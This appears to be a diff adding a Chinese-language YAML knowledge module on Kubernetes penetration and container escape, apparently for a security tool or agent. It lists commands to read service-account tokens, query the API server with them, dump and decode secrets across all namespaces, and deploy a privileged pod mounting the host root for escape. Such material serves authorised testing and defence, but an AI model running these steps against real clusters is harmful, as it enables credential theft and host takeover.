@@ -1,0 +1,89 @@
+name: Kubernetes安全
+description: Kubernetes集群渗透和容器逃逸技术
+domain: cloud
+version: '1.0'
+tags:
+- cloud
+- kubernetes
+- k8s
+- container
+knowledge: |
+  # Kubernetes安全
+
+  ## 环境检测
+
+  ### 检查是否在K8s中
+  ```bash
+  # 检查服务账户令牌
+  ls /var/run/secrets/kubernetes.io/serviceaccount/
+
+  # 查看令牌内容
+  cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+  # 检查环境变量
+  env | grep KUBERNETES
+  ```
+
+  ## 信息收集
+
+  ### 使用 kubectl
+  ```bash
+  # 获取 Pod 信息
+  kubectl get pods
+
+  # 获取服务
+  kubectl get services
+
+  # 获取密钥
+  kubectl get secrets
+
+  # 获取配置
+  kubectl get configmaps
+  ```
+
+  ### API Server 访问
+  ```bash
+  # 使用服务账户令牌访问 API
+  curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/pods
+  ```
+
+  ## 常见攻击路径
+
+  ### 1. 容器逃逸到节点
+  ```bash
+  # 创建特权 Pod
+  kubectl apply -f - <<EOF
+  apiVersion: v1
+  kind: Pod
+  metadata:
+    name: escape-pod
+  spec:
+    containers:
+    - name: escape
+      image: alpine
+      securityContext:
+        privileged: true
+      volumeMounts:
+      - name: host
+        mountPath: /host
+    volumes:
+    - name: host
+      hostPath:
+        path: /
+  EOF
+  ```
+
+  ### 2. 密钥泄露
+  ```bash
+  # 获取所有密钥
+  kubectl get secrets --all-namespaces
+
+  # 解码密钥
+  kubectl get secret secret-name -o jsonpath='{.data.password}' | base64 -d
+  ```
+
+  ### 3. RBAC 权限滥用
+  ```bash
+  # 检查当前权限
+  kubectl auth can-i --list
+  ```
